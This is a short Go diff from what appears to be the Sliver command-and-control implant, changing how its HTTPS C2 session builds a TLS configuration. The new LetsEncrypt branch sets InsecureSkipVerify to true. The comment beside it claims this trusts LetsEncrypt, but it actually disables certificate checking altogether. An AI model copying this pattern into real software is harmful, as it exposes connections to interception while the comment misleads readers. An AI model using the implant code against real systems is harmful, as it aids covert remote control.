@@ -88,15 +88,20 @@ func StartSessionHTTPS(c2URI *url.URL, profile *sliverpb.C2Profile) (*SliverHTTP
 	timeout := time.Duration(profile.PollTimeout)
 	fmt.Printf("Poll timeout: %s\n", timeout)
 
-	// Generate the TLS configuration
-	tlsConfig := cryptography.NewCredentialsTLS(p.Credentials.CACertPEM,
-		p.Credentials.CertPEM,
-		p.Credentials.KeyPEM).ClientConfig(uri.Hostname())
-	if tlsConfig == nil {
-		// {{if .Config.Debug}}
-		log.Printf("NO TLS CONFIG")
-		// {{end}}
-		return nil, errors.New("No TLS config")
+	// Generate the TLS configuration, either mutually authenticated or with LetsEncrypt
+	var tlsConfig *tls.Config
+	if profile.LetsEncrypt {
+		tlsConfig = &tls.Config{InsecureSkipVerify: true} // Trust LetsEncrypt server certificates
+	} else {
+		tlsConfig = cryptography.NewCredentialsTLS(profile.Credentials.CACertPEM,
+			profile.Credentials.CertPEM,
+			profile.Credentials.KeyPEM).ClientConfig(c2URI.Hostname())
+		if tlsConfig == nil {
+			// {{if .Config.Debug}}
+			log.Printf("NO TLS CONFIG")
+			// {{end}}
+			return nil, errors.New("No TLS config")
+		}
 	}
 
 	// Create and provision the client with the complete
